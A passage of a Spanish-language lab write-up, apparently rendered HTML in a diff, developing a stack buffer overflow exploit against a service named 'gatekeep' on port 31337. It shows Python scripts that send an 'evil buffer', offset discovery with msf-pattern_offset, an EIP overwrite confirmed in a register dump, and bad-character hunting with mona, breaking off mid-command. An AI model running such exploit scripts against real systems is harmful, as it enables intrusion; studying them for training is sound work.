+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+</span></span><span style="display:flex;"><span> <span style="color:#75715e"># s.recv(1024)</span>
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Con el valor del ESP y la longitud del payload, obtengo el offset usando msf-pattern_offset.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ msf-pattern_offset -q <span style="color:#ae81ff">41376541</span> -l <span style="color:#ae81ff">800</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">141</span>
+</span></span></code></pre></div><p>Actualizo el script de python con el offset y compruebo que puedo sobreescribir el EIP con el valor 42424242 que son las B. Esta vez no incluyo nada en el payload para comprobar que el EIP se ha sobreescribido correctamente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.109&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">141</span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;BBBB&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+</span></span><span style="display:flex;"><span> <span style="color:#75715e"># s.recv(1024)</span>
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Veo que el script ha funcionado correctamente, el EIP se ha sobreescribido con el valor 42424242 que son las B.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">EAX</span> <span style="color:#a6e22e">FFFFFFFF</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ECX</span> <span style="color:#ae81ff">7</span><span style="color:#a6e22e">EFDA000</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EDX</span> <span style="color:#ae81ff">00002736</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EBX</span> <span style="color:#ae81ff">005</span><span style="color:#a6e22e">EF400</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ESP</span> <span style="color:#ae81ff">005019</span><span style="color:#a6e22e">F8</span> <span style="color:#a6e22e">ASCII</span> <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">!!!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EBP</span> <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ESI</span> <span style="color:#ae81ff">08041470</span> <span style="color:#a6e22e">gatekeep</span><span style="color:#ae81ff">.08041470</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EDI</span> <span style="color:#ae81ff">005</span><span style="color:#a6e22e">EF400</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EIP</span> <span style="color:#ae81ff">42424242</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">C</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">ES</span> <span style="color:#ae81ff">002</span><span style="color:#a6e22e">B</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">P</span> <span style="color:#ae81ff">1</span>  <span style="color:#a6e22e">CS</span> <span style="color:#ae81ff">0023</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">A</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">SS</span> <span style="color:#ae81ff">002</span><span style="color:#a6e22e">B</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Z</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">DS</span> <span style="color:#ae81ff">002</span><span style="color:#a6e22e">B</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">S</span> <span style="color:#ae81ff">1</span>  <span style="color:#a6e22e">FS</span> <span style="color:#ae81ff">0053</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">7</span><span style="color:#a6e22e">EFDA000</span>(<span style="color:#a6e22e">FFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">T</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">GS</span> <span style="color:#ae81ff">002</span><span style="color:#a6e22e">B</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">D</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">LastErr</span> <span style="color:#a6e22e">WSAENOTSOCK</span> (<span style="color:#ae81ff">00002736</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EFL</span> <span style="color:#ae81ff">00010286</span> (<span style="color:#a6e22e">NO</span>,<span style="color:#a6e22e">NB</span>,<span style="color:#a6e22e">NE</span>,<span style="color:#a6e22e">A</span>,<span style="color:#a6e22e">S</span>,<span style="color:#a6e22e">PE</span>,<span style="color:#a6e22e">L</span>,<span style="color:#a6e22e">LE</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST0</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST1</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST2</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST3</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST4</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST5</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST6</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST7</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>      <span style="color:#a6e22e">E</span> <span style="color:#a6e22e">S</span> <span style="color:#a6e22e">P</span> <span style="color:#a6e22e">U</span> <span style="color:#a6e22e">O</span> <span style="color:#a6e22e">Z</span> <span style="color:#a6e22e">D</span> <span style="color:#a6e22e">I</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FST</span> <span style="color:#ae81ff">0000</span>  <span style="color:#a6e22e">Cond</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">Err</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>  (<span style="color:#a6e22e">GT</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FCW</span> <span style="color:#ae81ff">027</span><span style="color:#a6e22e">F</span>  <span style="color:#a6e22e">Prec</span> <span style="color:#a6e22e">NEAR</span>,<span style="color:#ae81ff">53</span>  <span style="color:#a6e22e">Mask</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Ahora vamos a buscar los badcharacters. Estos son los caracteres que no se pueden enviar al binario porque pueden estropear el shellcode que envíe finalmente en mi payload. Para ello, preparo un script de python que envía todos los caracteres posibles y compruebo que no se rompe el binario. En este caso, el binario se rompe con el caracter 00.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python3 bytearray.py
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>03<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>06<span style="color:#ae81ff">\x</span>07<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>09<span style="color:#ae81ff">\x</span>0a<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>0d<span style="color:#ae81ff">\x</span>0e<span style="color:#ae81ff">\x</span>0f<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>11<span style="color:#ae81ff">\x</span>12<span style="color:#ae81ff">\x</span>13<span style="color:#ae81ff">\x</span>14<span style="color:#ae81ff">\x</span>15<span style="color:#ae81ff">\x</span>16<span style="color:#ae81ff">\x</span>17<span style="color:#ae81ff">\x</span>18<span style="color:#ae81ff">\x</span>19<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>1b<span style="color:#ae81ff">\x</span>1c<span style="color:#ae81ff">\x</span>1d<span style="color:#ae81ff">\x</span>1e<span style="color:#ae81ff">\x</span>1f<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>21<span style="color:#ae81ff">\x</span>22<span style="color:#ae81ff">\x</span>23<span style="color:#ae81ff">\x</span>24<span style="color:#ae81ff">\x</span>25<span style="color:#ae81ff">\x</span>26<span style="color:#ae81ff">\x</span>27<span style="color:#ae81ff">\x</span>28<span style="color:#ae81ff">\x</span>29<span style="color:#ae81ff">\x</span>2a<span style="color:#ae81ff">\x</span>2b<span style="color:#ae81ff">\x</span>2c<span style="color:#ae81ff">\x</span>2d<span style="color:#ae81ff">\x</span>2e<span style="color:#ae81ff">\x</span>2f<span style="color:#ae81ff">\x</span>30<span style="color:#ae81ff">\x</span>31<span style="color:#ae81ff">\x</span>32<span style="color:#ae81ff">\x</span>33<span style="color:#ae81ff">\x</span>34<span style="color:#ae81ff">\x</span>35<span style="color:#ae81ff">\x</span>36<span style="color:#ae81ff">\x</span>37<span style="color:#ae81ff">\x</span>38<span style="color:#ae81ff">\x</span>39<span style="color:#ae81ff">\x</span>3a<span style="color:#ae81ff">\x</span>3b<span style="color:#ae81ff">\x</span>3c<span style="color:#ae81ff">\x</span>3d<span style="color:#ae81ff">\x</span>3e<span style="color:#ae81ff">\x</span>3f<span style="color:#ae81ff">\x</span>40<span style="color:#ae81ff">\x</span>41<span style="color:#ae81ff">\x</span>42<span style="color:#ae81ff">\x</span>43<span style="color:#ae81ff">\x</span>44<span style="color:#ae81ff">\x</span>45<span style="color:#ae81ff">\x</span>46<span style="color:#ae81ff">\x</span>47<span style="color:#ae81ff">\x</span>48<span style="color:#ae81ff">\x</span>49<span style="color:#ae81ff">\x</span>4a<span style="color:#ae81ff">\x</span>4b<span style="color:#ae81ff">\x</span>4c<span style="color:#ae81ff">\x</span>4d<span style="color:#ae81ff">\x</span>4e<span style="color:#ae81ff">\x</span>4f<span style="color:#ae81ff">\x</span>50<span style="color:#ae81ff">\x</span>51<span style="color:#ae81ff">\x</span>52<span style="color:#ae81ff">\x</span>53<span style="color:#ae81ff">\x</span>54<span style="color:#ae81ff">\x</span>55<span style="color:#ae81ff">\x</span>56<span style="color:#ae81ff">\x</span>57<span style="color:#ae81ff">\x</span>58<span style="color:#ae81ff">\x</span>59<span style="color:#ae81ff">\x</span>5a<span style="color:#ae81ff">\x</span>5b<span style="color:#ae81ff">\x</span>5c<span style="color:#ae81ff">\x</span>5d<span style="color:#ae81ff">\x</span>5e<span style="color:#ae81ff">\x</span>5f<span style="color:#ae81ff">\x</span>60<span style="color:#ae81ff">\x</span>61<span style="color:#ae81ff">\x</span>62<span style="color:#ae81ff">\x</span>63<span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\x</span>65<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>67<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>69<span style="color:#ae81ff">\x</span>6a<span style="color:#ae81ff">\x</span>6b<span style="color:#ae81ff">\x</span>6c<span style="color:#ae81ff">\x</span>6d<span style="color:#ae81ff">\x</span>6e<span style="color:#ae81ff">\x</span>6f<span style="color:#ae81ff">\x</span>70<span style="color:#ae81ff">\x</span>71<span style="color:#ae81ff">\x</span>72<span style="color:#ae81ff">\x</span>73<span style="color:#ae81ff">\x</span>74<span style="color:#ae81ff">\x</span>75<span style="color:#ae81ff">\x</span>76<span style="color:#ae81ff">\x</span>77<span style="color:#ae81ff">\x</span>78<span style="color:#ae81ff">\x</span>79<span style="color:#ae81ff">\x</span>7a<span style="color:#ae81ff">\x</span>7b<span style="color:#ae81ff">\x</span>7c<span style="color:#ae81ff">\x</span>7d<span style="color:#ae81ff">\x</span>7e<span style="color:#ae81ff">\x</span>7f<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>81<span style="color:#ae81ff">\x</span>82<span style="color:#ae81ff">\x</span>83<span style="color:#ae81ff">\x</span>84<span style="color:#ae81ff">\x</span>85<span style="color:#ae81ff">\x</span>86<span style="color:#ae81ff">\x</span>87<span style="color:#ae81ff">\x</span>88<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>8a<span style="color:#ae81ff">\x</span>8b<span style="color:#ae81ff">\x</span>8c<span style="color:#ae81ff">\x</span>8d<span style="color:#ae81ff">\x</span>8e<span style="color:#ae81ff">\x</span>8f<span style="color:#ae81ff">\x</span>90<span style="color:#ae81ff">\x</span>91<span style="color:#ae81ff">\x</span>92<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>94<span style="color:#ae81ff">\x</span>95<span style="color:#ae81ff">\x</span>96<span style="color:#ae81ff">\x</span>97<span style="color:#ae81ff">\x</span>98<span style="color:#ae81ff">\x</span>99<span style="color:#ae81ff">\x</span>9a<span style="color:#ae81ff">\x</span>9b<span style="color:#ae81ff">\x</span>9c<span style="color:#ae81ff">\x</span>9d<span style="color:#ae81ff">\x</span>9e<span style="color:#ae81ff">\x</span>9f<span style="color:#ae81ff">\x</span>a0<span style="color:#ae81ff">\x</span>a1<span style="color:#ae81ff">\x</span>a2<span style="color:#ae81ff">\x</span>a3<span style="color:#ae81ff">\x</span>a4<span style="color:#ae81ff">\x</span>a5<span style="color:#ae81ff">\x</span>a6<span style="color:#ae81ff">\x</span>a7<span style="color:#ae81ff">\x</span>a8<span style="color:#ae81ff">\x</span>a9<span style="color:#ae81ff">\x</span>aa<span style="color:#ae81ff">\x</span>ab<span style="color:#ae81ff">\x</span>ac<span style="color:#ae81ff">\x</span>ad<span style="color:#ae81ff">\x</span>ae<span style="color:#ae81ff">\x</span>af<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>b1<span style="color:#ae81ff">\x</span>b2<span style="color:#ae81ff">\x</span>b3<span style="color:#ae81ff">\x</span>b4<span style="color:#ae81ff">\x</span>b5<span style="color:#ae81ff">\x</span>b6<span style="color:#ae81ff">\x</span>b7<span style="color:#ae81ff">\x</span>b8<span style="color:#ae81ff">\x</span>b9<span style="color:#ae81ff">\x</span>ba<span style="color:#ae81ff">\x</span>bb<span style="color:#ae81ff">\x</span>bc<span style="color:#ae81ff">\x</span>bd<span style="color:#ae81ff">\x</span>be<span style="color:#ae81ff">\x</span>bf<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>c1<span style="color:#ae81ff">\x</span>c2<span style="color:#ae81ff">\x</span>c3<span style="color:#ae81ff">\x</span>c4<span style="color:#ae81ff">\x</span>c5<span style="color:#ae81ff">\x</span>c6<span style="color:#ae81ff">\x</span>c7<span style="color:#ae81ff">\x</span>c8<span style="color:#ae81ff">\x</span>c9<span style="color:#ae81ff">\x</span>ca<span style="color:#ae81ff">\x</span>cb<span style="color:#ae81ff">\x</span>cc<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>ce<span style="color:#ae81ff">\x</span>cf<span style="color:#ae81ff">\x</span>d0<span style="color:#ae81ff">\x</span>d1<span style="color:#ae81ff">\x</span>d2<span style="color:#ae81ff">\x</span>d3<span style="color:#ae81ff">\x</span>d4<span style="color:#ae81ff">\x</span>d5<span style="color:#ae81ff">\x</span>d6<span style="color:#ae81ff">\x</span>d7<span style="color:#ae81ff">\x</span>d8<span style="color:#ae81ff">\x</span>d9<span style="color:#ae81ff">\x</span>da<span style="color:#ae81ff">\x</span>db<span style="color:#ae81ff">\x</span>dc<span style="color:#ae81ff">\x</span>dd<span style="color:#ae81ff">\x</span>de<span style="color:#ae81ff">\x</span>df<span style="color:#ae81ff">\x</span>e0<span style="color:#ae81ff">\x</span>e1<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>e3<span style="color:#ae81ff">\x</span>e4<span style="color:#ae81ff">\x</span>e5<span style="color:#ae81ff">\x</span>e6<span style="color:#ae81ff">\x</span>e7<span style="color:#ae81ff">\x</span>e8<span style="color:#ae81ff">\x</span>e9<span style="color:#ae81ff">\x</span>ea<span style="color:#ae81ff">\x</span>eb<span style="color:#ae81ff">\x</span>ec<span style="color:#ae81ff">\x</span>ed<span style="color:#ae81ff">\x</span>ee<span style="color:#ae81ff">\x</span>ef<span style="color:#ae81ff">\x</span>f0<span style="color:#ae81ff">\x</span>f1<span style="color:#ae81ff">\x</span>f2<span style="color:#ae81ff">\x</span>f3<span style="color:#ae81ff">\x</span>f4<span style="color:#ae81ff">\x</span>f5<span style="color:#ae81ff">\x</span>f6<span style="color:#ae81ff">\x</span>f7<span style="color:#ae81ff">\x</span>f8<span style="color:#ae81ff">\x</span>f9<span style="color:#ae81ff">\x</span>fa<span style="color:#ae81ff">\x</span>fb<span style="color:#ae81ff">\x</span>fc<span style="color:#ae81ff">\x</span>fd<span style="color:#ae81ff">\x</span>fe<span style="color:#ae81ff">\x</span>ff
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.109&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">141</span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;BBBB&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b</span><span style="color:#e6db74">\&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+</span></span><span style="display:flex;"><span> <span style="color:#75715e"># s.recv(1024)</span>
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Antes de lanzar el exploit, ejecuto el comando !mona bytearray para generar un fichero con los caracteres buscados, empezando por el \x00, y luego ejecuto el comando !mona compare para comprobar que caracteres son los que no se pueden enviar al binario. En este caso, el binario se rompe con el caracter \x00 y \x0a.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">!</span><span style="color:#a6e22e">mona</span> <span style="color:#a6e22e">bytearray</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">b</span> <span style="color:#e6db74">&#34;\x00&#34;</span>
